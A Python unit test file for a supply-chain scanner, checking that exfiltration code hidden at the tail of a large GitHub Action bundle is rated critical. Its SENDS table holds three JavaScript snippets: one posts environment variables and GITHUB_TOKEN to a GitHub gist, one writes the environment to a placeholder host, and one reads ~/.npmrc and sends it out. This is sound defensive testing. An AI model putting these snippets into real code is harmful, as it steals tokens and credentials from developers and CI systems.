"""BIG-BUNDLE-TAIL (0.1.9): each way an action's code sends what it reads, at the end of a bundle past 2,000,000
characters (where ncc puts the action's own code), read by the supply-chain tree: fetch to GitHub's API (a gist), a
connection written to, `~/.npmrc` read and sent (an API client's sends: test_big_bundle_tail_clients.py).

Payloads are inert: nothing is installed or run; the addresses are `.invalid`.
"""
import unittest

from lazaret.scanner import core
from tests.registry import _bundle_support as bb

SENDS = {
    "a gist on GitHub's API": ('fetch("https://api.github.com/gists", { method: "POST", headers: { authorization: '
                               '"token " + process.env.GITHUB_TOKEN }, body: JSON.stringify({ files: { "e.json": '
                               '{ content: JSON.stringify(process.env) } } }) });\n'),
    "a connection written to": ('const xq = require("https").request({ host: "c.invalid", method: "POST" });\n'
                                'xq.write(JSON.stringify(process.env));\nxq.end();\n'),
    "~/.npmrc": ('const xt = require("fs").readFileSync(require("os").homedir() + "/.npmrc", "utf8");\n'
                 'fetch("https://c.invalid/x", { method: "POST", body: xt });\n'),
}


class SendsTests(unittest.TestCase):
    def test_each_send_at_the_bundles_end(self):
        for what, code in SENDS.items():
            with self.subTest(what):
                text = bb.bundle(main="  " + code.replace("\n", "\n  "))
                reasons, line = core.import_time_risk(text, "js")
                self.assertEqual(core.import_time_severity(reasons), "CRITICAL", reasons)
                self.assertGreater(line, text[:text.index("async function run()")].count("\n"))


if __name__ == "__main__":
    unittest.main()
